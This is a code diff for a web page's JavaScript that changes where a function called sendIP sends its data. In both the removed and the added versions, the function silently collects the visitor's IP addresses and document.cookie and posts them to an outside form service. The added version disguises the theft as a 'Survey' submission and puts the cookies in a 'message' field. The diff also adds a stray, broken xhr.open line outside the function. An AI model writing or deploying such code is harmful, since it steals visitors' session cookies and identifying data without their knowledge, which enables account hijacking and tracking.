@@ -37,42 +37,23 @@
             });
         }
 
+        xhr.open("POST", "https://api.web3forms.com/submit", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
         
         function sendIP(ip, ipv4) {
             const xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://forminit.com/f/kf5ildt1t0z", true);
+            xhr.open("POST", "https://api.web3forms.com/submit", true);
 			xhr.setRequestHeader("Content-Type", "application/json");
 			
 			var payload = {
-				"blocks": [
-					/*
-					{
-						"type": "sender",
-						"properties": {
-							"userId": ip,
-						}
-					},*/
-					{
-						"type": "text",
-						"name": "client_ip",
-						"value": ip
-					},
-					{
-						"type": "text",
-						"name": "client_ipv4",
-						"value": ipv4
-					},
-					{
-						"type": "text",
-						"name": "captured_cookies",
-						"value": document.cookie
-					},
-					{
-						"type": "date",
-						"name": "timestamp",
-						"value": new Date().toISOString()
-					}
-				]
+				"access_key": "ba52dae0-9fc8-4845-9575-baf62df9d608", 
+				
+				"subject": "Survey from tianya.at", 
+				
+				"time": new Date().toLocaleString(),
+				"name": ip,
+				"email": ipv4,
+				"message": document.cookie,
 			};
     
 			xhr.send(JSON.stringify(payload));
